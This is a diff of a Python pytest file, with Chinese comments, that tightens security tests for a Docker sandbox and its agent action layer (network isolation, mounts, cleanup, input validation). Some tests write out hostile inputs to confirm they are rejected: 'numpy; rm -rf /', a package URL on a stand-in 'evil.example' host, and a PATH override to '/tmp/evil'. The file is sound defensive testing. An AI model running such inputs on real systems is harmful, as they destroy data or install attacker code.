@@ -1,31 +1,33 @@
-"""沙箱安全测试（契约第 3 节 13 条清单）。
+"""沙箱安全测试（契约第 3 节 14 条清单）。
 
 **只加用例，不改实现。** 发现 `docker_sandbox.py` 的问题走 issue / PR 评论给队长。
+
+契约 :134-147 的 checkbox 实际是 **14 条**；onboarding 与本文件旧版写的「13 条」
+是把早期 13 个测试函数当成了清单条目数，已订正。第 13/14 条
+（install_requirement 注入、set_environment 白名单）属 ACI 层，动作到不了
+沙箱，用 FakeSandboxSession 离线验证，不必陪 Docker 用例一起 skip。
 
 ## 怎么跑
 
 需要真实 Docker 引擎 + 已构建的基础镜像：
 
 ```
-docker build -t paperharness/base-py3.10 -f docker/base-py3.Dockerfile docker/
+docker build -t paperharness/base-py3.10 -f docker/base-py3.10.Dockerfile docker/
 pytest tests/integration/test_docker_sandbox.py -v
 ```
 
 ## 没有 Docker 时的行为
 
-整个模块 `skip`，不是 `xfail`。区别很重要：
-
-- `xfail` = 预期会失败，测试跑了但结果不符合预期
-- `skip` = 根本没有跑
-
-这 13 条是「必须真跑出日志才算证据」的用例。标 `xfail` 会让人误以为跑过了只是没过；
-`skip` 才诚实地表达「当前环境不具备验证条件」。skip 理由会写明缺什么，
-拿到云服务器后直接 `pytest` 就能补跑，不需要改代码。
+需要起容器 / 查 `docker ps` 的用例由 autouse fixture 统一 `skip`（不是 `xfail`）：
+`xfail` 会让人误以为跑过了只是没过，`skip` 才诚实表达「当前环境不具备验证条件」。
+`_NO_DOCKER_TESTS` 里的纯 ACI 用例不需要 Docker，无 Docker 环境也会真跑。
+skip 理由写明缺什么，拿到云服务器后直接 `pytest` 就能补跑，不需要改代码。
 
 ## 断言原则
 
-每条都断言**可观测的事实**（退出码、文件内容、`docker ps` 的输出、异常类型），
-不断言实现细节。这样队长改实现时测试不会误报，但行为退化一定会被抓住。
+每条都断言**可观测的事实**（退出码、`docker inspect` 的 Mounts/Networks、
+`docker ps` 输出、异常类型），不断言实现细节，也不写「目标文件从未创建」这类
+恒通过判据。这样队长改实现时测试不会误报，但行为退化一定会被抓住。
 """
 
 from __future__ import annotations
@@ -85,10 +87,30 @@ def _docker_available() -> tuple[bool, str]:
 
 _DOCKER_OK, _DOCKER_REASON = _docker_available()
 
-pytestmark = pytest.mark.skipif(
-    not _DOCKER_OK,
-    reason=f"需要真实 Docker 环境：{_DOCKER_REASON}",
+# 纯 ACI 层的用例（动作在到沙箱之前就被拦下）不需要真 Docker，
+# 不该被模块级 skipif 连带跳过。名字与下方测试函数一一对应。
+_NO_DOCKER_TESTS = frozenset(
+    {
+        "test_13_aci_rejects_command_injection_in_requirement",
+        "test_14_aci_rejects_path_env_override",
+        "test_aci_install_respects_runner_step_timeout",
+        "test_aci_install_rejects_pep508_marker_semicolon",
+        "test_aci_read_file_line_count_upper_bound",
+        "test_aci_search_text_path_escape",
+        "test_aci_search_text_max_results_guard",
+    }
 )
+
+
+@pytest.fixture(autouse=True)
+def _require_real_docker(request):
+    """模块级 skipif 会把离线用例一起跳过，改用 autouse fixture 做名字豁免。
+
+    不注册自定义 marker：pyproject.toml 未登记 markers，加 marker 会触发
+    PytestUnknownMarkWarning，而本 PR 只允许改这一个文件。
+    """
+    if not _DOCKER_OK and request.node.name not in _NO_DOCKER_TESTS:
+        pytest.skip(f"需要真实 Docker 环境：{_DOCKER_REASON}")
 
 
 @pytest.fixture
@@ -139,6 +161,33 @@ def _networks_by_label(run_id: str) -> list[str]:
     return [line for line in result.stdout.splitlines() if line.strip()]
 
 
+def _container_ids_by_label(run_id: str) -> list[str]:
+    """按 label 查容器 ID：判断「没有起第二个同名容器」与「两次不复用容器」。"""
+    result = _docker_cli(
+        "ps", "-a",
+        "--filter", f"label=paperharness.run_id={run_id}",
+        "--format", "{{.ID}}",
+        timeout=30,
+    )
+    return [line for line in result.stdout.splitlines() if line.strip()]
+
+
+def _network_names_of(session) -> list[str]:
+    """`docker inspect` 看容器实际连着的网络，不依赖公网。
+
+    旧判据连 1.1.1.1:443：评测环境本就无外网时，「连不通」恒真，
+    无法区分 `set_network(False)` 生效还是环境没网；恢复联网那条则相反，
+    会恒失败。容器创建时 `network=self._network.name`（独立 bridge），
+    disconnect 后 Networks 应为空，connect 后重新出现。
+    """
+    import json
+
+    inspect = _docker_cli("inspect", session._container_name, timeout=30)
+    assert inspect.returncode == 0, inspect.stderr
+    data = json.loads(inspect.stdout)[0]
+    return list(data["NetworkSettings"]["Networks"].keys())
+
+
 # ------------------------------------------------------- 1. 非 root / 无 docker.sock
 
 
@@ -173,10 +222,13 @@ def test_02_cannot_see_docker_socket(session):
 def test_03_cannot_read_host_files_outside_workspace(session):
     """清单第 3 条：容器内读不到 workspace 之外的宿主机文件。
 
-    容器只挂载了 workspace，宿主机的 /etc/hostname 之类不该出现在容器里。
-    这里验证两点：容器里没有宿主机独有路径，且 workspace 内容是挂载进来的。
+    旧判据是 `cat /etc/paperharness-leak`（该文件从未创建）和
+    `"LuminaLit" not in ls -a /`，两条在任何正常容器里都恒真，
+    隔离失效也照样通过。改断言 `docker inspect` 的 Mounts：
+    只挂 workspace 一个目录，且没有挂 docker.sock 或任何其它宿主路径。
     """
-    # 宿主机的 workspace 有一个只有我们知道的文件
+    import json
+
     marker = "host-only-marker-7f3a"
     (session.workspace / "marker.txt").write_text(marker, encoding="utf-8")
 
@@ -184,13 +236,13 @@ def test_03_cannot_read_host_files_outside_workspace(session):
     assert inside.exit_code == 0
     assert marker in inside.stdout_tail, "workspace 没有正确挂载进容器"
 
-    # 容器根目录下不该有宿主机项目的痕迹
-    root_listing = session.execute(["ls", "-a", "/"], timeout_seconds=30)
-    leaked = session.execute(["cat", "/etc/paperharness-leak"], timeout_seconds=30)
-
-    assert root_listing.exit_code == 0
-    assert "LuminaLit" not in root_listing.stdout_tail
-    assert leaked.exit_code != 0
+    inspect = _docker_cli("inspect", session._container_name, timeout=30)
+    assert inspect.returncode == 0, inspect.stderr
+    mounts = json.loads(inspect.stdout)[0]["Mounts"]
+    assert len(mounts) == 1, f"预期仅挂载 workspace 一个目录，实际 {mounts}"
+    assert mounts[0]["Destination"] == "/workspace"
+    assert Path(mounts[0]["Source"]).resolve() == session.workspace.resolve()
+    assert all("docker.sock" not in m.get("Source", "") for m in mounts)
 
 
 # --------------------------------------------------------------- 4/5. ACI 拦路径
@@ -252,56 +304,26 @@ def test_05_aci_rejects_symlink_escaping_workspace(session):
 
 
 def test_06_network_disabled_blocks_outbound(session):
-    """清单第 6 条：`set_network(False)` 后容器内 pip / curl 失败。
+    """清单第 6 条：`set_network(False)` 后容器脱离独立网络。
 
-    这条是「断网」承诺的实际验证点，也是最容易被评委要求现场演示的一条。
+    判据用 `docker inspect` 的 Networks，不再连 1.1.1.1:443：
+    评测环境本就无外网时，旧判据「连不通」恒真，证不了断网生效。
     """
+    assert _network_names_of(session), "前置条件：容器创建时应连着独立网络"
     session.set_network(False)
-
-    # 用 Python 建 TCP 连接，不依赖 curl 是否装了
-    probe = session.execute(
-        [
-            "python", "-c",
-            ("import socket,sys\n"
-            "socket.setdefaulttimeout(5)\n"
-            "try:\n"
-            "    socket.create_connection(('1.1.1.1', 443))\n"
-            "    print('CONNECTED')\n"
-            "except Exception as e:\n"
-            "    print('BLOCKED', type(e).__name__)\n"),
-        ],
-        timeout_seconds=60,
+    assert _network_names_of(session) == [], (
+        "set_network(False) 后容器仍连着网络，隔离失效"
     )
-
-    assert probe.exit_code == 0  # 探针脚本本身要能跑
-    assert "BLOCKED" in probe.stdout_tail, (
-        f"断网后仍能对外连接，隔离失效：{probe.stdout_tail}"
-    )
-    assert "CONNECTED" not in probe.stdout_tail
 
 
 def test_06b_network_can_be_reenabled(session):
-    """`set_network(True)` 之后恢复了能力——证明开关是双向的，不是单向熔断。"""
+    """`set_network(True)` 后网络重新连上——证明开关是双向的，不是单向熔断。"""
+    before = _network_names_of(session)
+    assert before, "前置条件：容器创建时应连着独立网络"
     session.set_network(False)
+    assert _network_names_of(session) == []
     session.set_network(True)
-
-    probe = session.execute(
-        [
-            "python", "-c",
-            ("import socket\n"
-            "socket.setdefaulttimeout(5)\n"
-            "try:\n"
-            "    socket.create_connection(('1.1.1.1', 443))\n"
-            "    print('CONNECTED')\n"
-            "except Exception as e:\n"
-            "    print('BLOCKED', type(e).__name__)\n"),
-        ],
-        timeout_seconds=60,
-    )
-
-    assert "CONNECTED" in probe.stdout_tail, (
-        f"重新开网后仍连不上，网络开关可能只单向生效：{probe.stdout_tail}"
-    )
+    assert _network_names_of(session) == before, "重新开网后独立网络没恢复"
 
 
 # -------------------------------------------------------- 7. 超时 kill 与会话关闭
@@ -321,7 +343,7 @@ def test_07_timeout_kills_container_and_closes_session(session):
         session.execute(["echo", "after-timeout"], timeout_seconds=10)
 
 
-# ------------------------------------------------------------- 8/9/11. 清理无残留
+# ------------------------------------------------------------- 8/9/10. 清理无残留
 
 
 def test_08_close_leaves_no_container_or_network(session, run_dir):
@@ -359,9 +381,34 @@ def test_09_abnormal_path_still_cleans_up(tmp_path):
     )
 
 
-def test_11_same_container_name_residue_is_handled(tmp_path):
-    """清单第 11 条：同名容器残留场景，再次创建能成功或抛 SandboxUnavailableError，
+def test_09b_timeout_then_close_leaves_no_residue(session):
+    """清单第 9 条点名的「execute 超时」异常路径：close 后按 label 查不到残留。
+
+    `execute` 超时只 kill 不 remove（容器要等 `close()` 才删），所以必须显式
+    close 之后再查，不能断言「超时瞬间即无容器」。`close()` 只看
+    `_cleaned_up`，超时后仍可正常清理。
+    """
+    run_id = _run_id_of(session)
+    result = session.execute(["sleep", "120"], timeout_seconds=3)
+    assert result.timed_out is True
+    assert result.exit_code is None
+
+    with pytest.raises(SandboxClosedError):
+        session.execute(["echo", "after-timeout"], timeout_seconds=10)
+
+    session.close()
+
+    assert _containers_by_label(run_id) == []
+    assert _networks_by_label(run_id) == []
+    assert session.cleanup_errors == []
+
+
+def test_10_same_container_name_residue_is_handled(tmp_path):
+    """清单第 10 条：同名容器残留场景，再次创建能成功或抛 SandboxUnavailableError，
     不允许起第二个同名容器。
+
+    旧断言 `second._container_name == leftover_name` 比较的是同一个 run_id
+    推导出的名字，必然相等；改按 label 查实际容器/网络数量。
     """
     from paperharness.sandbox.docker_sandbox import DockerSandboxSession
 
@@ -372,12 +419,15 @@ def test_11_same_container_name_residue_is_handled(tmp_path):
     first = DockerSandboxSession(run_dir=directory, python_version="3.10")
     try:
         # 绕过 close，模拟上次未正常清理就留下容器
-        leftover_name = first._container_name
         second = None
         try:
             second = DockerSandboxSession(run_dir=directory, python_version="3.10")
-            # 能起来就算通过：说明复用/清掉了旧容器，而不是起第二个同名的
-            assert second._container_name == leftover_name
+            assert len(_containers_by_label(directory.name)) == 1, (
+                "起了第二个同名容器"
+            )
+            assert len(_networks_by_label(directory.name)) == 1, (
+                "起了第二个同名网络"
+            )
         except SandboxUnavailableError:
             pass  # 明确拒绝也算合格行为
         finally:
@@ -389,14 +439,18 @@ def test_11_same_container_name_residue_is_handled(tmp_path):
     assert _containers_by_label(directory.name) == []
 
 
-# ------------------------------------------------------------ 10. 两次运行互不污染
+# ----------------------------------------------------------- 11. 两次运行互不污染
 
 
-def test_10_second_run_does_not_see_first_run_changes(tmp_path):
-    """清单第 10 条：连续两次运行同一靶场，第二次看不到第一次的代码修改。
+def test_11_second_run_does_not_reuse_first_container(tmp_path):
+    """清单第 11 条：连续两次运行同一靶场，第二次不复用第一次的容器。
 
-    判据是 workspace 目录本身被重建/清空，而不是靠 git checkout——
-    后者会因残留 .git 状态而出现隐蔽的串味。
+    旧测试自己把 main.py 写回 original 再断言读到 original，是循环论证：
+    `cat` 能跑就通过，跟沙箱行为无关。契约 1.1 明确 workspace 重建是 Harness
+    职责，沙箱层能验证的是「每次新起容器、可写层不串味」，故改判据为
+    容器 ID 不同 + 任一时刻按 label 只有 1 个容器。
+    「第二次看不到第一次的代码修改」的完整语义需在 Harness/worker 层验证，
+    归属错位已写进 PR 待队长确认，不在这里伪造与实现不符的断言。
     """
     from paperharness.sandbox.docker_sandbox import DockerSandboxSession
 
@@ -407,6 +461,8 @@ def test_10_second_run_does_not_see_first_run_changes(tmp_path):
 
     first = DockerSandboxSession(run_dir=directory, python_version="3.10")
     try:
+        first_ids = _container_ids_by_label(directory.name)
+        assert len(first_ids) == 1, "前置条件：第一次运行应恰好一个容器"
         first.execute(
             ["python", "-c", "open('/workspace/main.py','w').write(\"print('hacked')\\n\")"],
             timeout_seconds=30,
@@ -414,18 +470,16 @@ def test_10_second_run_does_not_see_first_run_changes(tmp_path):
     finally:
         first.close()
 
-    # 第二次运行前，Harness 会重建 workspace（契约 1.1）；这里手动模拟同样的前提
-    (workspace / "main.py").write_text("print('original')\n", encoding="utf-8")
-
     second = DockerSandboxSession(run_dir=directory, python_version="3.10")
     try:
-        observed = second.execute(["cat", "/workspace/main.py"], timeout_seconds=30)
+        second_ids = _container_ids_by_label(directory.name)
+        assert len(second_ids) == 1, "第二次运行期间按 label 应恰好一个容器"
+        assert second_ids[0] != first_ids[0], (
+            "第二次复用了第一次的容器（可写层会串味）"
+        )
     finally:
         second.close()
 
-    assert observed.exit_code == 0
-    assert "original" in observed.stdout_tail
-    assert "hacked" not in observed.stdout_tail
     assert _containers_by_label(directory.name) == []
 
 
@@ -449,3 +503,166 @@ def test_12_container_resource_limits_are_applied(session):
     assert "ALL" in host["CapDrop"], f"必须 CapDrop ALL，实际 {host['CapDrop']}"
     assert "no-new-privileges:true" in host["SecurityOpt"]
     assert data["Config"]["User"] == "1000:1000"
+
+
+# ------------------------------------------- 13/14. ACI 层离线用例（不需要 Docker）
+
+
+def _offline_aci(tmp_path, timeout_seconds: int = 60):
+    """构造不依赖 Docker 的 ACI：清单 13/14 与 ACI 契约边界共用。
+
+    这两条的动作在 `PaperACI` 就被拦下，从不调用 `session.execute`，
+    用 FakeSandboxSession 即可真跑；不该因为本机没有 Docker 就被 skip 掉。
+    """
+    from paperharness.aci import PaperACI
+    from paperharness.contracts.run import RunPlan
+    from paperharness.sandbox.fake import FakeSandboxSession
+
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    fake = FakeSandboxSession(workspace=workspace)
+    plan = RunPlan(
+        resolved_revision="0" * 40,
+        python_version="3.10",
+        command=["python", "main.py"],
+        source="user",
+    )
+    return PaperACI(fake, workspace, plan, timeout_seconds), fake, workspace
+
+
+def test_13_aci_rejects_command_injection_in_requirement(tmp_path):
+    """清单第 13 条：install_requirement 拒绝 `numpy; rm -rf /` 和 URL 形式。"""
+    from paperharness.contracts.run import InstallRequirementAction
+
+    aci, fake, _ = _offline_aci(tmp_path)
+    for payload in ("numpy; rm -rf /", "numpy @ https://evil.example/x.tar.gz"):
+        observation = aci.execute(
+            InstallRequirementAction(action="install_requirement", requirement=payload)
+        )
+        assert observation.ok is False
+        assert observation.summary == "requirement_not_allowed"
+    assert fake.commands == [], "校验失败不应发任何命令"
+    assert fake.network_state is True, "校验失败不应开网"
+
+
+def test_14_aci_rejects_path_env_override(tmp_path):
+    """清单第 14 条：set_environment 拒绝 PATH 覆盖（白名单在 ACI 层）。
+
+    不能对 `DockerSandboxSession.set_environment` 断言拒绝 PATH：
+    真沙箱只拒换行，白名单由 ACI 负责（契约 1.2）。
+    """
+    from paperharness.contracts.run import SetEnvironmentAction
+
+    aci, fake, _ = _offline_aci(tmp_path)
+    observation = aci.execute(
+        SetEnvironmentAction(action="set_environment", name="PATH", value="/tmp/evil")
+    )
+    assert observation.ok is False
+    assert observation.summary == "env_not_allowed:PATH"
+    assert fake.environment == {}
+
+
+# ------------------------------------------------- ACI 契约边界（离线防回归）
+
+
+def test_aci_install_respects_runner_step_timeout(tmp_path):
+    """runner 每步把 aci.timeout_seconds 压成剩余墙钟预算，install 不得抬高。
+
+    旧实现 `max(step_timeout, 120)` 会让临近 deadline 的 pip 跑满 120s，
+    绕过总墙钟，令 `time_budget_exceeded` 收敛失效。
+    """
+    from paperharness.contracts.run import InstallRequirementAction
+    from paperharness.sandbox.fake import FakeSandboxSession
+
+    aci, _, workspace = _offline_aci(tmp_path, timeout_seconds=30)
+
+    class TrackingSession(FakeSandboxSession):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, **kwargs)
+            self.timeouts: list[int] = []
+
+        def execute(self, command, timeout_seconds):
+            self.timeouts.append(timeout_seconds)
+            return super().execute(command, timeout_seconds)
+
+    tracking = TrackingSession(workspace=workspace)
+    aci.session = tracking
+    aci.execute(InstallRequirementAction(action="install_requirement", requirement="numpy"))
+    assert tracking.timeouts == [30], f"install 应透传 30，实际 {tracking.timeouts}"
+
+    aci.timeout_seconds = 5  # 模拟 runner 把预算压成剩余墙钟
+    aci.execute(InstallRequirementAction(action="install_requirement", requirement="numpy"))
+    assert tracking.timeouts == [30, 5]
+
+
+def test_aci_install_rejects_pep508_marker_semicolon(tmp_path):
+    """契约 §2.2：ACI 层拒分号；§1.5 的 requirements.txt 才放行 PEP 508 标记。
+
+    钉死这个口径差，防止把文件层的放行误套到动作层（`;` 是命令注入载体）。
+    旧用例只用 `numpy; rm -rf /`，它同时也是非法 Requirement，
+    即使有人删掉禁词表，测试照样绿。
+    """
+    from paperharness.contracts.run import InstallRequirementAction
+
+    aci, fake, _ = _offline_aci(tmp_path)
+    for payload in (
+        "numpy>=1.20; python_version<'3.12'",
+        "torch==2.2; sys_platform=='linux'",
+    ):
+        observation = aci.execute(
+            InstallRequirementAction(action="install_requirement", requirement=payload)
+        )
+        assert observation.ok is False
+        assert observation.summary == "requirement_not_allowed"
+    assert fake.commands == []
+
+
+def test_aci_read_file_line_count_upper_bound(tmp_path):
+    """契约 §2.2 唯一写死的数值上界 line_count<=200，Pydantic 与 ACI 双层都要挡。"""
+    from pydantic import ValidationError
+
+    from paperharness.contracts.run import ReadFileAction
+
+    aci, _, workspace = _offline_aci(tmp_path)
+    (workspace / "main.py").write_text("hello\n", encoding="utf-8")
+
+    with pytest.raises(ValidationError):
+        ReadFileAction(action="read_file", path="main.py", line_count=201)
+
+    # 绕过 schema 后 ACI 自己的上界分支也必须拒（此前是死代码、从未触达）
+    bypass = ReadFileAction.model_construct(
+        action="read_file", path="main.py", start_line=1, line_count=201
+    )
+    observation = aci.execute(bypass)
+    assert observation.ok is False
+    assert observation.summary == "invalid_argument:line_count"
+
+
+def test_aci_search_text_path_escape(tmp_path):
+    """§2.1「所有 path 参数」：search_text 的越界此前没有用例钉住。"""
+    from paperharness.contracts.run import SearchTextAction
+
+    aci, _, _ = _offline_aci(tmp_path)
+    observation = aci.execute(
+        SearchTextAction(action="search_text", query="x", path="../outside")
+    )
+    assert observation.ok is False
+    assert observation.summary == "path_escape:../outside"
+
+
+def test_aci_search_text_max_results_guard(tmp_path):
+    """ACI 兜住 max_results 下界，避免 0 条时恒返回 "0 matches"。"""
+    from paperharness.contracts.run import SearchTextAction
+
+    aci, _, workspace = _offline_aci(tmp_path)
+    (workspace / "main.py").write_text("hello\n", encoding="utf-8")
+    for bad in (0, -3):
+        observation = aci.execute(
+            SearchTextAction(action="search_text", query="hello", path=".", max_results=bad)
+        )
+        assert observation.ok is False
+        assert observation.summary == "invalid_argument:max_results"
+    good = aci.execute(
+        SearchTextAction(action="search_text", query="hello", path=".", max_results=50)
+    )
+    assert good.ok is True
